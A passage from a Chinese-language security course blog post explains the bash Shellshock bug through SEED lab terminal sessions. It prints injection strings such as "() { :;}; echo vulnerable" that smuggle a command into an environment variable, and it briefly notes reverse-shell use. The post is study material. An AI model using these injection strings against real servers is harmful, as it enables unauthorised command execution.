+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu
+</span></span><span class="line"><span class="cl">gu is a hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -f gu
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu <span class="c1"># inherit the environment variables gu</span>
+</span></span><span class="line"><span class="cl">gu is a hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="p">|</span> grep gu
+</span></span><span class="line"><span class="cl"><span class="nv">gu</span><span class="o">=</span>hacker
+</span></span><span class="line"><span class="cl"><span class="nv">gu</span><span class="o">=()</span> <span class="o">{</span>  <span class="nb">echo</span> <span class="s2">&#34;gu is a hacker&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>结论：bash子进程继承了函数环境变量 <code>gu</code> <!-- raw HTML omitted --></p>
+<h4 id="shellshock发生的原因">shellshock发生的原因</h4>
+<p>接下来我们来尝试一点不一样的 <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>普通函数变量再尝试 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">ailx10</span><span class="o">=</span><span class="s1">&#39;() {  echo &#34;ailx10 is a hacker&#34;;}&#39;</span> <span class="c1"># 普通函数变量</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:48<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -nf gu <span class="c1"># 删除环境函数变量gu</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:48<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -n gu <span class="c1"># 删除环境变量gu</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:49<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -f ailx10 <span class="c1"># 保存环境函数变量，失败</span>
+</span></span><span class="line"><span class="cl">bash: export: ailx10: not a <span class="k">function</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:49<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> ailx10 <span class="c1"># 保存环境变量，成功</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:49<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash <span class="c1"># 进入Bash子进程</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ ailx10 <span class="c1">#ailx10 函数被继承</span>
+</span></span><span class="line"><span class="cl">ailx10 is a hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="p">|</span> grep ailx10 <span class="c1"># Pattern &#34;(){ :; }&#34; 被当作环境变量保存了（因此能够被进程）</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ailx10</span><span class="o">=()</span> <span class="o">{</span>  <span class="nb">echo</span> <span class="s2">&#34;ailx10 is a hacker&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="p">|</span> grep ailx10
+</span></span><span class="line"><span class="cl"><span class="nv">ailx10</span><span class="o">=()</span> <span class="o">{</span>  <span class="nb">echo</span> <span class="s2">&#34;ailx10 is a hacker&#34;</span><span class="p">;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>结论：因为我们再定义函数 <code>ailx10</code> 的时候，用了 <code>(){ :; }</code> ，所以无法被识别为环境函数变量，被当作是环境变量保存了 <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>() { :; }再尝试 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:57<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">ailx10</span><span class="o">=</span><span class="s1">&#39;() { :; };/bin/ls&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> ailx10 <span class="c1"># 当作环境变量保存</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash <span class="c1"># /bin/ls 作为环境变量却被执行了</span>
+</span></span><span class="line"><span class="cl">curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt
+</span></span><span class="line"><span class="cl">curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>至此，我们可以总结 Shellshock 漏洞产生的原因 <!-- raw HTML omitted --></p>
+<ol>
+<li>定义环境函数变量的时候，Bash错误的识别了 <code>() { :; }</code> 这种格式，被当作的是环境变量保存了 <!-- raw HTML omitted --></li>
+<li>调用新的bash子进程 <!-- raw HTML omitted --></li>
+<li>环境变量被继承，并执行，导致恶意代码被执行 <!-- raw HTML omitted --></li>
+</ol>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>验证Shellshock的方法</p>
+<p><figure><img src="/ox-hugo/2022-05-22_11-40-34_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&#34;echo this is a test&#34;</span>
+</span></span></code></pre></div><ol>
+<li>
+<p>第一部分会被Bash解析为一个环境变量进行保存 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>第二部分为需要执行的恶意指令 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>第三部分为调用一个bash子进程，同时会继承环境变量并执行恶意指令， <code>-c</code> 用来在新的bash下执行代码以表明新bash子进程启动成功 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&#34;echo this is a test&#34;</span>
+</span></span><span class="line"><span class="cl">vulnerable
+</span></span><span class="line"><span class="cl">this is a <span class="nb">test</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c :
+</span></span><span class="line"><span class="cl">vulnerable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>需要注意的是 <code>':'</code> 什么也不做是一个空命令，相当于 <code>::</code> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="k">if</span> true<span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> yes<span class="p">;</span> <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">yes
+</span></span><span class="line"><span class="cl">$ <span class="k">if</span> :<span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> yes<span class="p">;</span> <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">yes
+</span></span><span class="line"><span class="cl">$
+</span></span></code></pre></div></li>
+</ul>
+<h4 id="shellshock-的危害">shellshock 的危害</h4>
+<p>可以被用来反弹shell？ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-22_11-52-01_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="web应用中的条件竞争漏洞">Web应用中的条件竞争漏洞</h3>
+<p>条件竞争主要就是在于多线程的访问并修改服务端的资源，因为没有控制好多个线程之间的执行次序，没有很好的上锁，导致他们访问的数据不同步，从而导致最后的数据出现错误。 <!-- raw HTML omitted --></p>
+<p>这个我们在做CTF的时候应该也有遇到过，比如通过<a class="link" href="https://ginkgo.org.cn/posts/file_upload_ggctf_upload/#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"  target="_blank" rel="noopener"
+    >条件竞争绕过的文件上传漏洞</a> <!-- raw HTML omitted --></p>
+<h3 id="appendix">Appendix</h3>
+<h4 id="env">env</h4>
+<p><a class="link" href="https://linux.die.net/man/1/env"  target="_blank" rel="noopener"
+    >https://linux.die.net/man/1/env</a> <!-- raw HTML omitted -->
+Name <!-- raw HTML omitted -->
+env - run a program in a modified environment <!-- raw HTML omitted -->
+Synopsis <!-- raw HTML omitted -->
+env [OPTION]&hellip; [-] [NAME=VALUE]&hellip; [COMMAND [ARG]&hellip;] <!-- raw HTML omitted -->
+Description <!-- raw HTML omitted --></p>
+<p>Set each NAME to VALUE in the environment and run COMMAND. <!-- raw HTML omitted --></p>
+<p>-i, &ndash;ignore-environment <!-- raw HTML omitted -->
+start with an empty environment <!-- raw HTML omitted -->
+-0, &ndash;null <!-- raw HTML omitted -->
+end each output line with 0 byte rather than newline <!-- raw HTML omitted -->
+-u, &ndash;unset=NAME <!-- raw HTML omitted -->
+remove variable from the environment <!-- raw HTML omitted -->
+&ndash;help <!-- raw HTML omitted -->
+display this help and exit <!-- raw HTML omitted -->
+&ndash;version <!-- raw HTML omitted -->
+output version information and exit <!-- raw HTML omitted --></p>
+<p>A mere - implies -i. If no COMMAND, print the resulting environment. <!-- raw HTML omitted --></p>
+<h4 id="export">export</h4>
+<p>NAME <!-- raw HTML omitted -->
+export - Set export attribute for shell variables. <!-- raw HTML omitted --></p>
+<p>SYNOPSIS <!-- raw HTML omitted -->
+export [-fn] [name[=value] &hellip;] or export -p <!-- raw HTML omitted --></p>
+<p>DESCRIPTION <!-- raw HTML omitted -->
+Set export attribute for shell variables. <!-- raw HTML omitted --></p>
+<p>Marks each NAME for automatic export to the environment of subsequently <!-- raw HTML omitted -->
+executed commands.  If VALUE is supplied, assign VALUE before exporting. <!-- raw HTML omitted --></p>
+<p>Options: <!-- raw HTML omitted -->
+-f	refer to shell functions <!-- raw HTML omitted -->
+-n	remove the export property from each NAME <!-- raw HTML omitted -->
+-p	display a list of all exported variables and functions <!-- raw HTML omitted --></p>
+<p>An argument of `&ndash;&rsquo; disables further option processing. <!-- raw HTML omitted --></p>
+<p>Exit Status: <!-- raw HTML omitted -->
+Returns success unless an invalid option is given or NAME is invalid. <!-- raw HTML omitted --></p>
+<p>SEE ALSO <!-- raw HTML omitted -->
+bash(1) <!-- raw HTML omitted --></p>
+<p>IMPLEMENTATION <!-- raw HTML omitted -->
+GNU bash, version 5.0.17(1)-release (x86_64-redhat-linux-gnu) <!-- raw HTML omitted -->
+Copyright (C) 2019 Free Software Foundation, Inc. <!-- raw HTML omitted -->
+License GPLv3+: GNU GPL version 3 or later <a class="link" href="http://gnu.org/licenses/gpl.html"  target="_blank" rel="noopener"
+    >http://gnu.org/licenses/gpl.html</a> <!-- raw HTML omitted --></p>
+<h3 id="reference">Reference</h3>
+<p><a class="link" href="https://www.owasp.org/images/1/1b/Shellshock_-_Tudor_Enache.pdf"  target="_blank" rel="noopener"
+    >OWASP:Shellshock</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://zhuanlan.zhihu.com/p/35579956"  target="_blank" rel="noopener"
+    >什么是ShellShock攻击？</a> <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/security_testing/">security_testing</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 22, 2022 22:35 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/sct_topic_1_introduction_to_security_testing/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SCT Topic 1 Introduction to Security Testing</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/dlc_exam_preparation_notes/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DLC EXAM Preparation Notes</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/cfc_week_3_malware_uses_and_monetisation/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CFC Week 3: Malware uses and monetisation</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/cfc_week_2_advanced_malware_and_worldwide_spam_economy/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CFC Week 2: Advanced malware and worldwide SPAM</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/cfc_week_4_cybercrime_mitigations/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CFC Week 4: Cybercrime mitigations</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sct-topic-4-web-attacks-bypassing-client-side-authentication-and-others">SCT Topic 4: Web Attacks - Bypassing client-side authentication and others</a>
+      <ul>
+        <li><a href="#bypassing-client-side-controls-客户端检查绕过">Bypassing client-Side Controls 客户端检查绕过</a></li>
+        <li><a href="#local-remote-file-inclusion--lfi-rfi--文件包含">Local/Remote File Inclusion (LFI/RFI) 文件包含</a></li>
+        <li><a href="#command-injection-命令行注入">Command Injection 命令行注入</a></li>
+        <li><a href="#shellshock">Shellshock</a>
+          <ul>
+            <li><a href="#knowledge-prerequisites">Knowledge Prerequisites</a></li>
+            <li><a href="#shellshock发生的原因">shellshock发生的原因</a></li>
+            <li><a href="#shellshock-的危害">shellshock 的危害</a></li>
+          </ul>
+        </li>
+        <li><a href="#web应用中的条件竞争漏洞">Web应用中的条件竞争漏洞</a></li>
+        <li><a href="#appendix">Appendix</a>
+          <ul>
+            <li><a href="#env">env</a></li>
+            <li><a href="#export">export</a></li>
+          </ul>
+        </li>
+        <li><a href="#reference">Reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
